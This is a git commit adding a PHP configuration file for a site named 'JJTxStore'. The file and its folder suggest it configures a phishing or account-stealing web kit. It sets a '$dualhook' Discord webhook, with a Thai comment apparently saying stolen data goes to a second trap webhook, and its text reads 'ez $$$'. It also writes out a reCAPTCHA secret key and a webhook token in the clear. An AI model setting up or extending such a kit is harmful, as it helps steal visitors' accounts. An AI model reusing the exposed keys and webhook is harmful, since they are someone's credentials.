8b8e8801ef288694aa9a55b823728d8e0765b71f
Kircy <89261568+YcrikHub@users.noreply.github.com>
2023-11-24 21:29:42 +0700

    Add files via upload

---
+++ web x/profile/setup/setup.php
@@ -0,0 +1,16 @@
+<?php
+$siteName = "JJTxStore";
+$webText = htmlspecialchars("ez $$$");
+/* To get your public and secret key, go to https://www.google.com/recaptcha/about then admin console, press +
+(the label can be anything), choose recaptcha v3, add your domain, accept tos, submit. you will then be presented with your keys. */
+$recaptcha_sitekey = "6LeQlf4kAAAAAI3IpiUNeuwoS-Mp7jTxefQ4uB7s";
+$recaptcha_secretkey = "6LeQlf4kAAAAACAzpcQb0sJ0xAd4bF0Tvi5SqEIj"; 
+$dualhook = "https://discord.com/api/webhooks/1085206436935634965/wOW9S682cUNwyO9xQBRFEfgX2EdE0srryWxU5Skys_rBzKR6bYfYCiCI2FIlwEP9Q0bC"; /* ดักซ้อนดักใส่ webhook ตรงนี้ */
+$mainpfp = "https://cdn.discordapp.com/attachments/1071088361156124883/1082214959573893181/138_20230306151444.png";
+$embedColor = "918f00"; #WITHOUT HASHTAG
+/* controller info*/
+//Example: TEST-A1B2C3D4E5
+$controllerpath = "JJTxStore";
+//MAKE SURE DISCORD IS LIKE https://discord.com/invite/vkevin
+$discord = "https://discord.com/invite/jjtxstore";
+?>
